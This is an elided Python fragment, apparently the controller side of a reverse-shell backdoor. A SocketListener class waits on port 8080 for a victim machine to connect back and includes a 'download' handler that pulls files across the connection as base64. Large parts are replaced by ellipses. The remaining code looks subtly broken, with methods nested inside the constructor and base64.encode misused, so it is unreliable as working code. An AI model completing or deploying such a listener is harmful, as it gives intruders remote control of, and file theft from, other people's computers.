...
class SocketListener:
    def __init__(self,ip,port):
        ...
        my_listener.bind((ip,port))  # other machine ip and channel(port)
        my_listener.listen(0)

        print("Listening on port 8080")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection established" + str(my_address))
        ...
        def read_file_contents(self, path):
            with open(path, 'rb') as my_file:
                return base64.encode(my_file.read())
        ...
        def start_listener(self):
            while True:
                ...
                try:
                    ...
                    if command_output[0] == "download" and "Error!" not in command_output:
...
my_socket_listener = SocketListener("your-ip",8080)
